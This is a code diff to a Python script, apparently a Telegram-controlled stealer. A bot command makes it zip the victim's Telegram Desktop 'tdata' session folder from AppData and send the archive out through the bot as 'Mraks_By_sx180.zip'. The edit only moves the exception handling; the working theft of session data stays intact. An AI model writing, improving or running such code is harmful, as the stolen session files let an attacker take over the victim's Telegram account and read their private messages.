@@ -303,9 +303,9 @@ def create_zip_archive(source_dir, output_zip):
         print(f"Error creating zip archive: {str(e)}")
         return None
 def archive_and_send():
-    user = os.path.expanduser("~")
-    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
-        try:
+    try:
+        user = os.path.expanduser("~")
+        if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
             source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
             temp_dir = os.path.join(os.getcwd(), 'temp')
             if not os.path.exists(temp_dir):
@@ -317,10 +317,10 @@ def archive_and_send():
                 send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
             else:
                 print("Failed to create or send zip file.")
-        except Exception as e:
-            print(f"Error creating or sending zip file: {str(e)}")
-    else:
-        print("Папка 'tdata' не найдена.")
+        else:
+            print("Папка 'tdata' не найдена.")
+    except Exception as e:
+        print(f"Error occurred: {str(e)}")
 @bot.message_handler(commands=['archive_and_send'])
 def handle_archive_and_send(message):
     chat_id = message.chat.id
